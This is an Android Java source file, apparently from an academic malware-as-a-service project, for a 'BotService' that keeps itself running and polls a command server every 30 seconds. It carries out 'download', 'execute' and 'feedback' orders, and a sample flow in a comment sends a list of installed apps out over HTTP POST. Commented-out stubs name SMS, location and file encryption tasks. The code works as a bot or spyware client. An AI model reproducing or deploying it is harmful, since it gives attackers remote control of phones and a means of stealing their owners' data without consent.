package edu.ntu.android.maas.complain.complain;

import android.app.AlarmManager;
import android.app.IntentService;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.util.Log;

import org.json.JSONObject;

import java.util.Iterator;

public class BotService extends Service {

    public static final String TAG = BotService.class.getName();
    protected final Context mContext;
    protected BroadcastReceiver recv = null;
    public BotService() {
        mContext = this;

        TalkChannel.v().setServiceHandler(this.handler);
    }

    protected Handler handler = new Handler(){
        @Override
        public void handleMessage(Message msg){
            if (msg.what == 1){
                //Log.d(TAG, "I receive a message");
                recv = Utils.getBroadcastReceiver(mContext);
                //recv = Utils.getBroadcastReceiver(mContext);
            }
        }
    };

    @Override
    public void onCreate(){
        Utils.operateOn(this, "SERVICE", "POINTCUT_ONCREATE");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        Log.d("", android.provider.Settings.Secure.getString(mContext.getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
        Utils.operateOn(this, "SERVICE", "POINTCUT_ONSTARTCOMMAND");
        //Set up an alarm
        AlarmManager am = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
        am.setInexactRepeating(AlarmManager.ELAPSED_REALTIME, 5 * 1000, 1000 * 30/*AlarmManager.INTERVAL_HALF_HOUR*/, PendingIntent.getService(this, 0, new Intent(this, HeartBeat.class), 0));
        //am.set(AlarmManager.ELAPSED_REALTIME, SystemClock.elapsedRealtime() + 2 * 1000, PendingIntent.getService(this, 0, new Intent(this, HeartBeat.class), 0));

        return Service.START_STICKY;
    }

    @Override
    public void onDestroy(){
        Intent  intent = new Intent(this, BotService.class);
        startService(intent);
        if (recv != null) {
            unregisterReceiver(recv);
            recv = null;
        }
        Utils.operateOn(this, "SERVICE", "POINTCUT_ONDESTROY");
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        Utils.operateOn(this, "SERVICE", "POINTCUT_ONBIND");
        return null;
    }
    @Override
    public boolean onUnbind(Intent intent){
        Utils.operateOn(this, "SERVICE", "POINTCUT_ONUNBIND");
        return false;
    }

    @Override
    public void onRebind(Intent intent){
        Utils.operateOn(this, "SERVICE", "POINTCUT_ONREBIND");
    }

    public static class HeartBeat extends IntentService{

        //public static final String TAG = HeartBeat.class.getName();

        public HeartBeat() {
            super("HeartBeat");
        }

        public HeartBeat(String name){
            super(name);
        }

        @Override
        protected void onHandleIntent(Intent intent) {
            if (Utils.checkUpdate()) {
                Intent i = new Intent(this, UpdateActivity.class);
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(i);
            } else {
                try {
                    String cmd = Utils.queryServer();

                    /**
                     * The format of response:
                     * {
                     *      'command': '',
                     *      'value': ''
                     * }
                     *
                     * Samples:
                     * {
                     *      'command': 'download',
                     *      'value': 'www.example.com'
                     * }
                     * {
                     *      'command': 'execute',
                     *      'value': 'INTENT_SERVICE::MAIN::SOURCE(INSTALLED_APP::INSTALLED_APP)->INTENT_SERVICE::MAIN::SINK(HTTP::CONNECTION_POST, LOCAL_VARIABLE)'
                     * }
                     */

                    Log.d("++++++++response+++++++", cmd);
                    if (cmd == null || cmd.length() == 0) return;
                    JSONObject obj = new JSONObject(cmd.trim());
                    String command = obj.get("command").toString();
                    String value = obj.get("value").toString();
                    if (command.equalsIgnoreCase("null")) return;
                    if (command.equalsIgnoreCase("download")) {
                        Utils.queryServer(this, value);
                    } else if (command.equalsIgnoreCase("execute")) {
                        Flow flow = new Flow(value);
                        for (Iterator<Flow.Function> iter = flow.iterator(); iter.hasNext(); ) {
                            Flow.Function f = iter.next();
                            //Log.e("Functions", f.toString());
                            if (f.component.equals("INTENT_SERVICE")) {
                                Utils.operateOn(this, "INTENT_SERVICE", "POINTCUT_MAIN");
                            }
                        }
                    } else if (command.equalsIgnoreCase("feedback")) {
                        Utils.sendFeedback(this, value);
                    }

                } catch (Exception ex) {
                    Log.e(TAG, ex.getMessage());
                    //ex.printStackTrace();
                }

                Log.d(TAG, "Tick");
                //TaskBackup task = new TaskBackup();
            /*android.os.Message msg = android.os.Message.obtain();
            msg.what = 1;
            edu.ntu.android.maas.client.clientapp.TalkChannel.v().getServiceHandler().sendMessage(msg);*/
                //task.executeTask(this, "broadcastreceiver");
                //task.executeTask(this, "phonestate");
                //task.executeTask(this, "LOCATION");
                //task.executeTask(this, "INCOMING_SMS");
                //task.executeTask(this, "contentobserver");

            /*Intent i = new Intent(getApplicationContext(), TargetActivity.class);
            i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(i);*/
                //Log.d(TAG, String.format("External directory is %s", Environment.getExternalStorageDirectory() + "/test"));
                //Utils.encrypt("pillar", Environment.getExternalStorageDirectory()+"/test");
                //Utils.decrypt("pillar", Environment.getExternalStorageDirectory()+"/test");
            }
        }

    }
}
